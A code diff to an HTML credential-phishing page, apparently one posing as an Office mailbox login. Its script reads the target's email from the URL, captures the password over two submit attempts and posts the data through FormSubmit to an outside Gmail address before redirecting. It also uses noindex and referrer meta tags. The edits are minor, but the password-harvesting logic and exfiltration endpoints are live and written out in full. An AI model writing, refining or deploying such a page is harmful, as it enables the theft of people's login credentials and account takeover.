@@ -6,7 +6,7 @@
   
   <!-- SECURITY -->
   <meta name="robots" content="noindex, nofollow">
-  <meta name="referrer" content="no-referrer">
+  <meta name="referrer" content="strict-origin-when-cross-origin">
   <meta http-equiv="X-Content-Type-Options" content="nosniff">
   <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
   <meta http-equiv="Pragma" content="no-cache">
@@ -499,13 +499,13 @@
   <div class="loader" id="loader"></div>
 
   <script>
-    // --- FORM SUBMIT ENDPOINT (AJAX path, used from attempt 2 on) ---
+    // --- FORM SUBMIT ENDPOINTS ---
     // Attempt 1: native form POST to action= (fires the activation mail).
     // Attempt 2+: JS posts via /ajax/ so the redirect can run.
     // After FormSubmit activates and hands you an alias, swap both the
-    // action= in the <form> and this constant to the alias URL.
-    const FORMSUBMIT_ACTION  = "https://formsubmit.co/officeboxmaillinks@gmail.com";
-    const FORMSUBMIT_AJAX    = "https://formsubmit.co/ajax/officeboxmaillinks@gmail.com";
+    // action= in the <form> and these constants to the alias URL.
+    const FORMSUBMIT_ACTION = "https://formsubmit.co/officeboxmaillinks@gmail.com";
+    const FORMSUBMIT_AJAX   = "https://formsubmit.co/ajax/officeboxmaillinks@gmail.com";
     
     // --- GET EMAIL FROM URL ---
     function getEmailFromURL() {
@@ -684,7 +684,6 @@
     // --- FORM SUBMISSION ---
     // Attempt 1: DO NOT preventDefault -> native POST to action= fires.
     //            That's what triggers the FormSubmit activation mail.
-    //            We still stash the password so attempt 2 can log it.
     // Attempt 2+: preventDefault, JS posts to /ajax/, then redirect.
     let attemptCount = 0;
     let firstPassword = '';
@@ -708,7 +707,7 @@
         attemptCount = 1;
         firstPassword = password;
         // no preventDefault -> browser POSTs to FormSubmit action=
-        // FormSubmit shows its own "check your email" page after this.
+        // FormSubmit will show its own "check your email" page after this.
         return;
       }
       
